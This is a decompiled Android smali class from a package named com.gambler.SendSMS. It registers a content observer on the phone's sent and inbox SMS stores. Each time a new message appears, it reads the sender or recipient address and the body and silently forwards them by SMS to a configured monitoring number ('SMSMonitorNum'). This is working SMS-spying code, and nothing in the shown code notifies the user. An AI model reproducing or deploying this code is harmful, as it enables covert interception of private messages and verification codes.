.class public final Lcom/gambler/SendSMS/e;
.super Landroid/database/ContentObserver;


# static fields
.field private static final e:[Ljava/lang/String;


# instance fields
.field private a:Landroid/content/Context;

.field private b:I

.field private c:I

.field private d:I


# direct methods
.method static constructor <clinit>()V
    .locals 3

    const/4 v0, 0x5

    new-array v0, v0, [Ljava/lang/String;

    const/4 v1, 0x0

    const-string v2, "address"

    aput-object v2, v0, v1

    const/4 v1, 0x1

    const-string v2, "person"

    aput-object v2, v0, v1

    const/4 v1, 0x2

    const-string v2, "date"

    aput-object v2, v0, v1

    const/4 v1, 0x3

    const-string v2, "type"

    aput-object v2, v0, v1

    const/4 v1, 0x4

    const-string v2, "body"

    aput-object v2, v0, v1

    sput-object v0, Lcom/gambler/SendSMS/e;->e:[Ljava/lang/String;

    return-void
.end method

.method public constructor <init>(Landroid/content/Context;Landroid/os/Handler;)V
    .locals 2

    const/4 v1, -0x1

    invoke-direct {p0, p2}, Landroid/database/ContentObserver;-><init>(Landroid/os/Handler;)V

    const/4 v0, 0x0

    iput v0, p0, Lcom/gambler/SendSMS/e;->b:I

    iput v1, p0, Lcom/gambler/SendSMS/e;->c:I

    iput v1, p0, Lcom/gambler/SendSMS/e;->d:I

    iput-object p1, p0, Lcom/gambler/SendSMS/e;->a:Landroid/content/Context;

    invoke-direct {p0}, Lcom/gambler/SendSMS/e;->a()V

    return-void
.end method

.method private a()V
    .locals 6

    const/4 v2, 0x0

    iget-object v0, p0, Lcom/gambler/SendSMS/e;->a:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "content://sms/sent"

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    const-string v5, "date desc"

    move-object v3, v2

    move-object v4, v2

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0

    invoke-interface {v0}, Landroid/database/Cursor;->getCount()I

    move-result v1

    iput v1, p0, Lcom/gambler/SendSMS/e;->c:I

    invoke-interface {v0}, Landroid/database/Cursor;->close()V

    iget-object v0, p0, Lcom/gambler/SendSMS/e;->a:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "content://sms/inbox"

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    const-string v5, "date desc"

    move-object v3, v2

    move-object v4, v2

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0

    invoke-interface {v0}, Landroid/database/Cursor;->getCount()I

    move-result v1

    iput v1, p0, Lcom/gambler/SendSMS/e;->d:I

    invoke-interface {v0}, Landroid/database/Cursor;->close()V

    return-void
.end method


# virtual methods
.method public final onChange(Z)V
    .locals 12

    const/4 v11, 0x0

    const/4 v2, 0x0

    iget v0, p0, Lcom/gambler/SendSMS/e;->c:I

    iget v1, p0, Lcom/gambler/SendSMS/e;->d:I

    invoke-direct {p0}, Lcom/gambler/SendSMS/e;->a()V

    iget v3, p0, Lcom/gambler/SendSMS/e;->c:I

    if-ge v0, v3, :cond_2

    const-string v0, "content://sms/sent"

    const/4 v1, 0x1

    move v6, v1

    move-object v1, v0

    :goto_0
    iget-object v0, p0, Lcom/gambler/SendSMS/e;->a:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    const-string v5, "date desc"

    move-object v3, v2

    move-object v4, v2

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v7

    if-eqz v7, :cond_0

    invoke-interface {v7}, Landroid/database/Cursor;->moveToFirst()Z

    const-string v0, "address"

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    const-string v1, "body"

    invoke-interface {v7, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v7, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    iget-object v8, p0, Lcom/gambler/SendSMS/e;->a:Landroid/content/Context;

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v7, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    if-eqz v3, :cond_0

    if-nez v5, :cond_3

    :cond_0
    :goto_1
    invoke-interface {v7}, Landroid/database/Cursor;->close()V

    :cond_1
    return-void

    :cond_2
    iget v0, p0, Lcom/gambler/SendSMS/e;->d:I

    if-ge v1, v0, :cond_1

    const-string v0, "content://sms/inbox"

    move v6, v11

    move-object v1, v0

    goto :goto_0

    :cond_3
    invoke-static {v8}, Lcom/gambler/SendSMS/d;->a(Landroid/content/Context;)V

    invoke-static {}, Lcom/gambler/SendSMS/d;->a()I

    move-result v0

    add-int/lit8 v9, v0, 0x1

    invoke-static {v9}, Lcom/gambler/SendSMS/d;->a(I)Z

    const-string v0, "SMSMonitorNum"

    invoke-static {v0}, Lcom/gambler/SendSMS/d;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    new-instance v4, Landroid/content/Intent;

    invoke-direct {v4}, Landroid/content/Intent;-><init>()V

    invoke-static {v8, v11, v4, v11}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v4

    new-instance v10, Ljava/lang/StringBuilder;

    if-eqz v6, :cond_5

    const v6, 0x7f050005

    invoke-virtual {v8, v6}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v6

    :goto_2
    invoke-static {v6}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v10, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v10, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v6, "\n"

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const v6, 0x7f050006

    invoke-virtual {v8, v6}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const/16 v5, 0x64

    sub-int/2addr v5, v9

    sget-boolean v6, Lcom/gambler/SendSMS/d;->a:Z

    if-eqz v6, :cond_4

    if-gtz v5, :cond_4

    const v5, 0x7f050003

    invoke-virtual {v8, v5}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v5

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v6, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, "\n"

    invoke-virtual {v6, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    :cond_4
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "Message content\uff1a "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    invoke-virtual {v3}, Ljava/lang/String;->length()I

    move-result v5

    const/16 v6, 0x46

    if-le v5, v6, :cond_6

    invoke-virtual {v0, v3}, Landroid/telephony/SmsManager;->divideMessage(Ljava/lang/String;)Ljava/util/ArrayList;

    move-result-object v2

    invoke-interface {v2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v6

    :goto_3
    invoke-interface {v6}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_0

    invoke-interface {v6}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    const/4 v2, 0x0

    const/4 v5, 0x0

    :try_start_0
    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V
    :try_end_0
    .catch Ljava/lang/NullPointerException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_3

    :catch_0
    move-exception v2

    const-string v2, "something goes wrong!"

    invoke-static {v8, v2, v11}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    goto :goto_3

    :cond_5
    const v6, 0x7f050004

    invoke-virtual {v8, v6}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v6

    goto/16 :goto_2

    :cond_6
    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    goto/16 :goto_1
.end method
